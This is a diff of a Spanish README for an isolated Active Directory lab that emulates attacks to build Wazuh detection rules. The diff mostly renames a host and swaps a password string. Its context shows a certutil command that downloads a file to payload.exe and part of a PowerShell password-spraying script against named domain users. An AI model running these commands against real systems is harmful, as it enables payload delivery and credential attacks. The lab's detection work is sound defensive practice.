@@ -11,7 +11,7 @@ Con este laboratorio basico de Active Directory se intenta recrear ciberataques 
 El entorno opera sobre una red aislada en VirtualBox (`192.168.56.0/24`):
 
 * **DC01 (`192.168.56.10`):** Windows Server 2022 (Domain Controller `deviltrigger.local`, 2 GB RAM).
-* **CLIENT01 (`192.168.56.20`):** Windows 11 Enterprise unido al dominio con Sysmon y agente Wazuh (2.5 GB RAM).
+* **CLIENTE01 (`192.168.56.20`):** Windows 11 Enterprise unido al dominio con Sysmon y agente Wazuh (2.5 GB RAM).
 * **Wazuh Server (`192.168.56.8`):** Ubuntu Server 24.04 con Wazuh 4.9 (4.5 GB RAM, OpenSearch Heap limitado a 2 GB).
 
 ---
@@ -83,7 +83,7 @@ Los Living-off-the-Land Binaries (LOLBins) son ejecutables legítimos y firmados
 
 ### Emulación Ofensiva
 
-En **CLIENT01**, tras aislar las firmas de Windows Defender para permitir la recolección de telemetría de comportamiento, se ejecutó la descarga remota simulada:
+En **CLIENTE01**, tras aislar las firmas de Windows Defender para permitir la recolección de telemetría de comportamiento, se ejecutó la descarga remota simulada:
 
 ```powershell
 certutil.exe -urlcache -split -f http://example.com/favicon.ico C:\Users\Public\payload.exe
@@ -125,7 +125,7 @@ Se creó la regla `100101` (Nivel 12) inspeccionando los argumentos del proceso 
 
 ### Verificación en Threat Hunting
 
-La ejecución disparó la alerta correlacionada en tiempo real bajo el agente `CLIENT01`, asociando las técnicas T1105 (Ingress Tool Transfer) y T1218 (System Binary Proxy Execution):
+La ejecución disparó la alerta correlacionada en tiempo real bajo el agente `CLIENTE01`, asociando las técnicas T1105 (Ingress Tool Transfer) y T1218 (System Binary Proxy Execution):
 
 <img alt="threat hunting lolbins" src="https://github.com/user-attachments/assets/65aab21f-3fee-40b5-b9c7-9e69756a4b88" />
 
@@ -143,7 +143,7 @@ En **CLIENTE01** se ejecutó un script en PowerShell que consulta al controlador
 
 ```powershell
 $usuarios = @("j.serrano", "r.ruiz", "j.medina", "i.shuang", "d.galaz")
-$passFalsa = "Otono2026Invalida!"
+$passFalsa = "locurotedecontraseña!"
 $dominio = "deviltrigger.local"
 
 Add-Type -AssemblyName System.DirectoryServices.AccountManagement
@@ -166,7 +166,7 @@ Cada intento genera en **DC01** un evento de fallo de logon:
 
 - `win.system.eventID`: `4625` (_An account failed to log on_)
 - `win.eventdata.subStatus`: `0xc000006a` (_Bad user name or password_)
-- `win.eventdata.ipAddress`: `192.168.56.20` (IP de CLIENT01)
+- `win.eventdata.ipAddress`: `192.168.56.20` (IP de CLIENTE01)
 - `win.eventdata.targetUserName`: Distintos identificadores para cada intento.
 
 <img alt="logcrudo fuerza bruta" src="https://github.com/user-attachments/assets/0cd21e5c-94aa-48a3-8f8e-e98925501b41" />
@@ -206,7 +206,7 @@ Con la finalización de esta fase, el laboratorio cuenta con una línea base act
 |**Técnica MITRE**|**Vector**|**Fuente de Telemetría**|**Regla SIEM**|**Nivel**|
 |---|---|---|---|---|
 |**T1558.003**|Kerberoasting (RC4 Degradation)|DC01 (Security 4769)|`100100`|10|
-|**T1105 / T1218**|Abuso de LOLBin (`certutil -urlcache`)|CLIENT01 (Sysmon 1)|`100101`|12|
+|**T1105 / T1218**|Abuso de LOLBin (`certutil -urlcache`)|CLIENTE01 (Sysmon 1)|`100101`|12|
 |**T1110.003**|Password Spraying (Agregación temporal)|DC01 (Security 4625)|`100102`|11|
 
 El siguiente bloque del laboratorio abordará la fase de **Post-Explotación**, cubriendo movimiento lateral mediante **PsExec y WMI**, y técnicas avanzadas de volcado de memoria sobre el proceso `lsass.exe` (**Mimikatz / Sysmon Event ID 10**).
